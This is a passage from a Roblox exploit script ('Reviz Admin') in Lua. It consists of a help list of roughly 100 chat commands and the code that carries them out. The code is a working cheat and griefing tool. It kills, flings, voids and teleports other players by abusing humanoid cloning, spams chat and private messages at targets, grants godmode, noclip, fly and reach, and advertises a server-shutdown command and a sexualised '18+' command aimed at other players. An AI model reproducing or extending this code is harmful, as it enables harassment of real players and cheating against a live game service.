jumppower and hipheight to default values,\n[24] annoy [plr] -- Loop teleports you to the player,\n[25] unannoy,\n[26] headwalk [plr] -- Loop teleports you to the player head,\n[27] unheadwalk,\n[28] nolimbs -- Removes your arms and legs,\n[29] god -- Gives you FE Godmode,\n[30] drophats -- Drops your accessories,\n[31] droptool -- Drops any tool you have equipped,\n[32] loopdhats -- Loop drops your accessories,\n[33] unloopdhats,\n[34] loopdtool -- Loop drops any tools you have equipped,\n[35] unloopdtool,\n[36] invisible -- Gives you invisibility CREDIT TO TIMELESS,\n[37] view [plr] -- Changes your camera to the player character,\n[38] unview,\n[39] goto [plr] -- Teleports you to player,\n[40] fly -- Allows you to fly,\n[41] unfly,\n[42] chat [msg] -- Makes you chat a message,\n[43] spam [msg] -- Spams a message,\n[44] unspam,\n[45] spamwait [num] -- Changes delay of chatting a message for the spam command in seconds default is 1 second,\n[46] pmspam [plr] -- Spams a player in private message,\n[47] unpmspam,\n[48] cfreeze [plr] -- Freezes a player on your client, they will only be frozen for you,\n[49] uncfreeze [plr],\n[50] unlockws -- Unlocks the workspace,\n[51] lockws -- Locks the workspace,\n[52] btools -- Gives you btools that will only show to you useful for deleting certain blocks only for you,\n[53] pstand -- Enables platform stand,\n[54] unpstand -- Disables platform stand,\n[55] blockhead -- Removes your head mesh,\n[56] sit,\n[57] bringobj [obj] -- Only shows on client, brings an object/part to you constantly, can be used to bring healing parts, weapons, money etc, type in exact name,\n[58] wsvis [num] -- Changes visibility of workspace parts, num should be between 0 and 1, only shows client sided,\n[59] hypertotal -- Loads in my FE GUI Hypertotal,\n[60] cmds -- Prints all commands,\n[61] rmeshhats/blockhats -- Removes the meshes of all your accessories aka block hats,\n[62] rmeshtool/blocktool -- Removes the mesh of the tool you have equipped aka block tool,\n[63] spinner -- Makes you spin,\n[64] nospinner,\n[65] reach [num] -- Gives you reach, mostly used for swords, say ;reachd for default and enter number after for custom,\n[66] noreach -- Removes reach, must have tool equipped,\n[67] rkill [plr] -- Kills you and the player, use kill to just kill the player without dying,\n[68] tp me [plr] -- Alternative to goto,\n[69] cbring [plr] -- Brings player infront of you, shows only on client, allows you to do damage to player,\n[70] uncbring,\n[71] swap [plr] -- You need a tool! Swaps players position with yours and your position with players,\n[72] givetool [plr] -- Gives the tool you have equipped to the player,\n[73] glitch [plr] -- Glitches you and the player, looks very cool,\n[74] unglitch -- Unglitches you,\n[75] grespawn -- Alternative to normal respawn and usually works best for when you want to reset with FE Godmode,\n[76] explorer -- Loads up DEX,\n[77] reset -- Resets your character.,\n[78] anim [id] -- Applies an animation on you, must be created by ROBLOX,\n[79] animgui -- Loads up Energize animations GUI,\n[80] savepos -- Saves your current position,\n[81] loadpos -- Teleports you to your saved position,\n[82] bang [plr] -- 18+,\n[83] unbang,\n[84] delcmdbar -- Removes the command bar completely,\n[85] bringmod [obj] -- Brings all the parts in a model, client only, comes from ;bringobj enter exact name of model,\n[86] shutdown -- Uses harkinians script to shutdown server,\n[87] respawn -- If grespawn doesnt work you can use respawn,\n[88] delobj [obj] -- Deletes a certain brick in workspace, client sided,\n[89] getplrs -- Prints all players in game,\n[90] deldecal -- Deletes all decals client sided,\n[91] opfinality -- Loads in my FE GUI Opfinality,\n[92] remotes -- Prints all remotes in the game in the console when added,\n[93] noremotes -- Stops printing remotes,\n[94] tpdefault -- Stops all loop teleports to a player,\n[95] stopsit -- Will not allow you to sit,\n[96] gosit -- Allows you to sit,\n[97] clicktp -- Enables click tp,\n[98] noclicktp -- Disables click tp,\n[99] toolson -- If any tools are dropped in the workspace you will automatically get them,\n[100] toolsoff -- Stops ;toolson,\n[101] version -- Gets the admin version, \n This list of commands is NOT showing everything, go to my thread in the pastebin link to see ALL commands."
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextSize = 15
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left
TextLabel.TextYAlignment = Enum.TextYAlignment.Top
closegui.Name = "closegui"
closegui.Parent = CMDSFRAME
closegui.BackgroundColor3 = Color3.new(0.890196, 0.223529, 0.0588235)
closegui.BorderSizePixel = 0
closegui.Position = UDim2.new(0.995000005, 0, 0, 0)
closegui.Size = UDim2.new(0.0545952693, 0, 0.0728644878, 0)
closegui.Font = Enum.Font.SourceSansBold
closegui.FontSize = Enum.FontSize.Size24
closegui.Text = "X"
closegui.TextColor3 = Color3.new(1, 1, 1)
closegui.TextSize = 20
 
closegui.MouseButton1Click:connect(function()
    CMDSFRAME.Visible = false
end)
 
game:GetService('RunService').Stepped:connect(function()
    if spin then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[spinplr.Name].Character.HumanoidRootPart.CFrame
    end
    if followed then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[flwplr.Name].Character.HumanoidRootPart.CFrame + game:GetService("Players")[flwplr.Name].Character.HumanoidRootPart.CFrame.lookVector * -5
    end
    if traill then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[trlplr.Name].Character.HumanoidRootPart.CFrame + game:GetService("Players")[trlplr.Name].Character.HumanoidRootPart.CFrame.lookVector * 5
    end
    if annoying then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[annplr.Name].Character.HumanoidRootPart.CFrame
    end
    if hwalk then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[hdwplr.Name].Character.HumanoidRootPart.CFrame + Vector3.new(0, 4, 0)
    end
    if staring then
        lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(lplayer.Character.Torso.Position, game:GetService("Players")[stareplr.Name].Character.Torso.Position)
    end
end)
game:GetService('RunService').Stepped:connect(function()
    if noclip then
        if lplayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
            lplayer.Character.Head.CanCollide = false
            lplayer.Character.Torso.CanCollide = false
            lplayer.Character["Left Leg"].CanCollide = false
            lplayer.Character["Right Leg"].CanCollide = false
        else
            lplayer.Character.Humanoid:ChangeState(11)
        end
    end
    if changingstate then
        lplayer.Character.Humanoid:ChangeState(statechosen)
    end
end)
game:GetService('RunService').Stepped:connect(function()
    if droppinghats then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Parent = workspace
            end
        end
    end
    if droppingtools then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Parent = workspace
            end
        end
    end
    if removingmeshhats then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if removingmeshtool then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
end)
game:GetService('RunService').Stepped:connect(function()
    if banpl then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[bplrr].Character.HumanoidRootPart.CFrame
    end
end)
game:GetService('RunService').Stepped:connect(function()
    if stopsitting then
        lplayer.Character.Humanoid.Sit = false
    end
end)
 
plr = lplayer
hum = plr.Character.HumanoidRootPart
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
    if key == "e" then
        if mouse.Target then
            if clickgoto then
                hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
            elseif clickdel then
                mouse.Target:Destroy()
            end
        end
    end
end)
 
game:GetService("Workspace").ChildAdded:connect(function(part)
    if gettingtools then
        if part:IsA("Tool") then
            part.Handle.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        end
    end
end)
 
lplayer.Chatted:Connect(function(msg)
    if string.sub(msg, 1, 6) == (prefix.."kill ") then
        if string.sub(msg, 7) == "me" then
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(100000,0,100000)
        else
            for i,v in pairs(GetPlayer(string.sub(msg, 7)))do
                local NOW = lplayer.Character.HumanoidRootPart.CFrame
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                local function tp(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1:MoveTo(char2.Head.Position)
                end
                end
                wait(0.1)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.5)
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
                wait(0.7)
                tp(lplayer,game:GetService("Players")[v.Name])
                wait(0.7)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."bring ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8)))do
            local NOW = lplayer.Character.HumanoidRootPart.CFrame
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            local function tp(player,player2)
            local char1,char2=player.Character,player2.Character
            if char1 and char2 then
            char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
            end
            end
            local function getout(player,player2)
            local char1,char2=player.Character,player2.Character
            if char1 and char2 then
            char1:MoveTo(char2.Head.Position)
            end
            end
            tp(game:GetService("Players")[v.Name], lplayer)
            wait(0.2)
            tp(game:GetService("Players")[v.Name], lplayer)
            wait(0.5)
            lplayer.Character.HumanoidRootPart.CFrame = NOW
            wait(0.5)
            getout(lplayer, game:GetService("Players")[v.Name])
            wait(0.3)
            lplayer.Character.HumanoidRootPart.CFrame = NOW
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 6) == (prefix.."spin ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            lplayer.Character.Animate.Disabled = false
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            spinplr = v
            wait(0.5)
            spin = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."unspin") then
        spin = false
    end
    if string.sub(msg, 1, 8) == (prefix.."attach ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            wait(0.3)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            attplr = v
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."unattach ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
            local function getout(player,player2)
            local char1,char2=player.Character,player2.Character
            if char1 and char2 then
            char1:MoveTo(char2.Head.Position)
            end
            end
            getout(lplayer, game:GetService("Players")[v.Name])
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."follow ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            followed = true
            flwplr = v
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."unfollow") then
        followed = false
    end
    if string.sub(msg, 1, 10) == (prefix.."freefall ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
            local NOW = lplayer.Character.HumanoidRootPart.CFrame
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.2)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.6)
            lplayer.Character.HumanoidRootPart.CFrame = NOW
            wait(0.6)
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,50000,0)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."trail ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
            traill = true
            trlplr = v
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."untrail") then
        traill = false
    end
    if string.sub(msg, 1, 7) == (prefix.."orbit ") then
        if string.sub(msg, 8) == "all" or string.sub(msg, 8) == "others" or string.sub(msg, 8) == "me" then
            lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        else
            for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
                local o = Instance.new("RocketPropulsion")
                o.Parent = lplayer.Character.HumanoidRootPart
                o.Name = "Orbit"
                o.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
                o:Fire()
                noclip = true
            end
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."unorbit") then
        lplayer.Character.HumanoidRootPart.Orbit:Destroy()
        noclip = false
    end
    if string.sub(msg, 1, 7) == (prefix.."fling ") then
        if string.sub(msg, 8) == "all" or string.sub(msg, 8) == "others" or string.sub(msg, 8) == "me" then
            lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        else
            for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
                local y = Instance.new("RocketPropulsion")
                y.Parent = lplayer.Character.HumanoidRootPart
                y.CartoonFactor = 1
                y.MaxThrust = 800000
                y.MaxSpeed = 1000
                y.ThrustP = 200000
                y.Name = "Fling"
                game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
                y.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
                y:Fire()
                noclip = true
            end
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."unfling") then
        noclip = false
        lplayer.Character.HumanoidRootPart.Fling:Destroy()
        game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
        wait(0.4)
        lplayer.Character.HumanoidRootPart.Fling:Destroy()
    end
    if string.sub(msg, 1, 8) == (prefix.."fecheck") then
        if game:GetService("Workspace").FilteringEnabled == true then
            warn("FE is Enabled (Filtering Enabled)")
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "FE is Enabled";
                Text = "Filtering Enabled. Enjoy using Reviz Admin!";
            })
        else
            warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "FE is Disabled";
                Text = "Filtering Disabled. Consider using a different admin script.";
            })
        end
    end
    if string.sub(msg, 1, 6) == (prefix.."void ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.2)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.6)
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999999999,0,999999999999999)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."noclip") then
        noclip = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Noclip enabled";
        Text = "Type ;clip to disable";
        })
    end
    if string.sub(msg, 1, 5) == (prefix.."clip") then
        noclip = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Noclip disabled";
        Text = "Type ;noclip to enable";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."speed ") then
        lplayer.Character.Humanoid.WalkSpeed = (string.sub(msg, 8))
    end
    if string.sub(msg, 1, 4) == (prefix.."ws ") then
        lplayer.Character.Humanoid.WalkSpeed = (string.sub(msg, 5))
    end
    if string.sub(msg, 1, 11) == (prefix.."hipheight ") then
        lplayer.Character.Humanoid.HipHeight = (string.sub(msg, 12))
    end
    if string.sub(msg, 1, 4) == (prefix.."hh ") then
        lplayer.Character.Humanoid.HipHeight = (string.sub(msg, 5))
    end
    if string.sub(msg, 1, 11) == (prefix.."jumppower ") then
        lplayer.Character.Humanoid.JumpPower = (string.sub(msg, 12))
    end
    if string.sub(msg, 1, 4) == (prefix.."jp ") then
        lplayer.Character.Humanoid.JumpPower = (string.sub(msg, 5))
    end
    if string.sub(msg, 1, 8) == (prefix.."default") then
        lplayer.Character.Humanoid.JumpPower = 50
        lplayer.Character.Humanoid.WalkSpeed = 16
        lplayer.Character.Humanoid.HipHeight = 0
    end
    if string.sub(msg, 1, 7) == (prefix.."annoy ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
            annoying = true
            annplr = v
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."unannoy") then
        annoying = false
    end
    if string.sub(msg, 1, 10) == (prefix.."headwalk ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
            hwalk = true
            hdwplr = v
        end
    end
    if string.sub(msg, 1, 11) == (prefix.."unheadwalk") then
        hwalk = false
    end
    if string.sub(msg, 1, 8) == (prefix.."nolimbs") then
        lplayer.Character["Left Leg"]:Destroy()
        lplayer.Character["Left Arm"]:Destroy()
        lplayer.Character["Right Leg"]:Destroy()
        lplayer.Character["Right Arm"]:Destroy()
    end
    if string.sub(msg, 1, 4) == (prefix.."god") then
        lplayer.Character.Humanoid.Name = 1
        local l = lplayer.Character["1"]:Clone()
        l.Parent = lplayer.Character
        l.Name = "Humanoid"
        wait(0.1)
        lplayer.Character["1"]:Destroy()
        game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
        lplayer.Character.Animate.Disabled = true
        wait(0.1)
        lplayer.Character.Animate.Disabled = false
        lplayer.Character.Humanoid.DisplayDistanceType = "None"
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "FE Godmode enabled";
        Text = "Use ;grespawn or ;respawn to remove";
        })
    end
    if string.sub(msg, 1, 9) == (prefix.."drophats") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Parent = workspace
            end
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."droptool") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Parent = workspace
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."loopdhats") then
        droppinghats = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Loop Drop Enabled";
        Text = "Type ;unloopdhats to disable";
        })
    end
    if string.sub(msg, 1, 12) == (prefix.."unloopdhats") then
        droppinghats = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Loop Drop Disabled";
        Text = "Type ;loopdhats to enable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."loopdtool") then
        droppingtools = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Loop Drop Enabled";
        Text = "Type ;unloopdtool to disable";
        })
    end
    if string.sub(msg, 1, 12) == (prefix.."unloopdtool") then
        droppingtools = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Loop Drop Disabled";
        Text = "Type ;loopdtool to enable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."invisible") then -- Credit to Timeless
        Local = game:GetService('Players').LocalPlayer
        Char  = Local.Character
        touched,tpdback = false, false
        box = Instance.new('Part',workspace)
        box.Anchored = true
        box.CanCollide = true
        box.Size = Vector3.new(10,1,10)
        box.Position = Vector3.new(0,10000,0)
        box.Touched:connect(function(part)
            if (part.Parent.Name == Local.Name) then
                if touched == false then
                    touched = true
                    function apply()
                        if script.Disabled ~= true then
                            no = Char.HumanoidRootPart:Clone()
                            wait(.25)
                            Char.HumanoidRootPart:Destroy()
                            no.Parent = Char
                            Char:MoveTo(loc)
                            touched = false
                        end end
                    if Char then
                        apply()
                    end
                end
            end
        end)
        repeat wait() until Char
        loc = Char.HumanoidRootPart.Position
        Char:MoveTo(box.Position + Vector3.new(0,.5,0))
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Invisibility enabled!";
        Text = "Reset or use ;respawn to remove.";
        })
    end
    if string.sub(msg, 1, 6) == (prefix.."view ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            if game:GetService("Players")[v.Name].Character.Humanoid then
                game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Humanoid
            else
                game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
            end
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."unview") then
        if lplayer.Character.Humanoid then
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
        else
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
        end
    end
    if string.sub(msg, 1, 6) == (prefix.."goto ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
        end
    end
    if string.sub(msg, 1, 4) == (prefix.."fly") then
    repeat wait() until lplayer and lplayer.Character and lplayer.Character:FindFirstChild('HumanoidRootPart') and lplayer.Character:FindFirstChild('Humanoid')
    repeat wait() until Mouse
   
    local T = lplayer.Character.HumanoidRootPart
    local CONTROL = {F = 0, B = 0, L = 0, R = 0}
    local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
    local SPEED = speedget
   
    local function fly()
        flying = true
        local BG = Instance.new('BodyGyro', T)
        local BV = Instance.new('BodyVelocity', T)
        BG.P = 9e4
        BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
        BG.cframe = T.CFrame
        BV.velocity = Vector3.new(0, 0.1, 0)
        BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
        spawn(function()
        repeat wait()
        lplayer.Character.Humanoid.PlatformStand = true
        if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
        SPEED = 50
        elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
        SPEED = 0
        end
        if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
        BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
        lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
        elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
        BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
        else
        BV.velocity = Vector3.new(0, 0.1, 0)
        end
        BG.cframe = workspace.CurrentCamera.CoordinateFrame
                until not flying
                CONTROL = {F = 0, B = 0, L = 0, R = 0}
                lCONTROL = {F = 0, B = 0, L = 0, R = 0}
                SPEED = 0
                BG:destroy()
                BV:destroy()
                lplayer.Character.Humanoid.PlatformStand = false
            end)
        end
    Mouse.KeyDown:connect(function(KEY)
        if KEY:lower() == 'w' then
            CONTROL.F = speedfly
        elseif KEY:lower() == 's' then
            CONTROL.B = -speedfly
        elseif KEY:lower() == 'a' then
            CONTROL.L = -speedfly
        elseif KEY:lower() == 'd' then
            CONTROL.R = speedfly
        end
    end)
    Mouse.KeyUp:connect(function(KEY)
        if KEY:lower() == 'w' then
            CONTROL.F = 0
        elseif KEY:lower() == 's' then
            CONTROL.B = 0
        elseif KEY:lower() == 'a' then
            CONTROL.L = 0
        elseif KEY:lower() == 'd' then
            CONTROL.R = 0
        end
    end)
    fly()
    end
    if string.sub(msg, 1, 6) == (prefix.."unfly") then
        flying = false
        lplayer.Character.Humanoid.PlatformStand = false
    end
    if string.sub(msg, 1, 6) == (prefix.."chat ") then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer((string.sub(msg, 7)), "All")
    end
    if string.sub(msg, 1, 6) == (prefix.."spam ") then
        spamtext = (string.sub(msg, 7))
        spamming = true
    end
    if string.sub(msg, 1, 7) == (prefix.."unspam") then
        spamming = false
    end
    if string.sub(msg, 1, 10) == (prefix.."spamwait ") then
        spamdelay = (string.sub(msg, 11))
    end
    if string.sub(msg, 1, 8) == (prefix.."pmspam ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            pmspammed = v.Name
            spammingpm = true
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."unpmspam") then
        spammingpm = false
    end
    if string.sub(msg, 1, 9) == (prefix.."cfreeze ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 10))) do
            v.Character["Left Leg"].Anchored = true
            v.Character["Left Arm"].Anchored = true
            v.Character["Right Leg"].Anchored = true
            v.Character["Right Arm"].Anchored = true
            v.Character.Torso.Anchored = true
            v.Character.Head.Anchored = true
        end
    end
    if string.sub(msg, 1, 11) == (prefix.."uncfreeze ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 12))) do
            v.Character["Left Leg"].Anchored = false
            v.Character["Left Arm"].Anchored = false
            v.Character["Right Leg"].Anchored = false
            v.Character["Right Arm"].Anchored = false
            v.Character.Torso.Anchored = false
            v.Character.Head.Anchored = false
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."unlockws") then
        local a = game:GetService("Workspace"):getChildren()
        for i = 1, #a do
            if a[i].className == "Part" then
                a[i].Locked = false
            elseif a[i].className == "Model" then
                local r = a[i]:getChildren()
                for i = 1, #r do
                    if r[i].className == "Part" then
                    r[i].Locked = false
                    end
                end
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "Workspace unlocked. Use ;lockws to lock.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."lockws") then
        local a = game:GetService("Workspace"):getChildren()
        for i = 1, #a do
            if a[i].className == "Part" then
                a[i].Locked = true
            elseif a[i].className == "Model" then
                local r = a[i]:getChildren()
                for i = 1, #r do
                    if r[i].className == "Part" then
